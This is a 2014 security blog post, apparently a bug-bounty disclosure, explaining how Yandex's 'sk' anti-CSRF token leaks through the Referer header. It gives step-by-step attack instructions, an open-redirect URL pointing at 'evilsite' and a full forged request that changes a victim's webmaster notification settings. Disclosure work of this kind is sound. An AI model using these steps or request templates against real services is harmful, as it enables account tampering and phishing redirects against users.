---
title: Bypass anti CSRF token of Yandex!
date: 2014-05-07 00:00:00 +02:00
categories:
- Info Leakage
- CSRF
layout: post
excerpt: When you browse a link in docviewer.yandex.com, The site will recreate a
  token named `sk`, which is used to validate a redirection and anti-csrf token `sk`
  is also an anti-csrf token on  {% highlight text %} http://webmaster.yandex.ru`,.....
comments: true
thumbnail: japan.jpg
---

When you browse a link in docviewer.yandex.com, The site will recreate a token named sk, which is used to validate a redirection and anti-csrf token. sk is also an anti-CSRF token on `http://webmaster.yandex.ru, https://docviewer.yandex.com/r.xml`. now If the attacker knows the value of your sk token, he can make a redirection and CSRF attack. How to know the token of the victim ???. Because `http://docviewer.yandex.com/r.xml?sk=thecsrftokenofvictim&url=evilsite` useD GET request, the params are showed in URL and it also changeable to https to HTTP. as a result, you can use REFERER HEADER to get the token.


### HACK STEPS 
 * Upload a document with link or a hyperlink. that hyperlink is the attacker's site..
 * Select the file, Share the link using the share button then get the link
 * Browse that link, Then click the view button you will redirect to docviewer.yandex.com
 * Change the https to http to allow us to see the referer in our site.
 {% highlight text %} 
https://docviewer.yandex.com/?url=ya-disk-public://nhP6POxtEi4v9wDffRyOFHbGQgIOhlsEbLhl3zH9c7k%3D&name=testxxx.odt to http://docviewer.yandex.com/?url=ya-disk-public://nhP6POxtEi4v9wDffRyOFHbGQgIOhlsEbLhl3zH9c7k%3D&name=testxxx.odt
{% endhighlight %}
* Send the url to victim and induce him to click the link for attacker'site to able to leak the anti-CSRF token.

 now you have his `sk` token! that is the bypass!

 **for redirection**
 {% highlight text %} 
 https://docviewer.yandex.com/r.xml?sk=thecsrftokenofvictim&url=evilsite
 {% endhighlight %}

**for csrf** → 
{% highlight text %}
http://webmaster.yandex.com/settings/messages/types.xml?email_1=EMAIL&email_2=EMAIL&message_3=MESSAGE&email_3=EMAIL&message_4=MESSAGE&percent=50&message_5=MESSAGE&message_6=MESSAGE&message_7=MESSAGE&message_8=MESSAGE&email_8=EMAIL&message_9=MESSAGE&message_10=MESSAGE&message_12=MESSAGE&message_17=MESSAGE&message_18=MESSAGE&message_19=MESSAGE&email_19=EMAIL&message_21=MESSAGE&email_21=EMAIL&message_22=MESSAGE&email_22=EMAIL&message_32=MESSAGE&do=save&sk=TOKENOFVICTIM
{% endhighlight %}

**This is wide CSRF attack which affect other Yandex domain.**

### list of affected Yandex domain

* http://appmetrica.yandex.com/
* https://calendar.yandex.ru
* https://disk.yandex.com/
* docviewer.yandex.com
* m.contact.yandex.com.tr & etc

*NOTE: i used javascript code to get the leaked csrf token on refrerer header and append it to my CSRF PoC.*
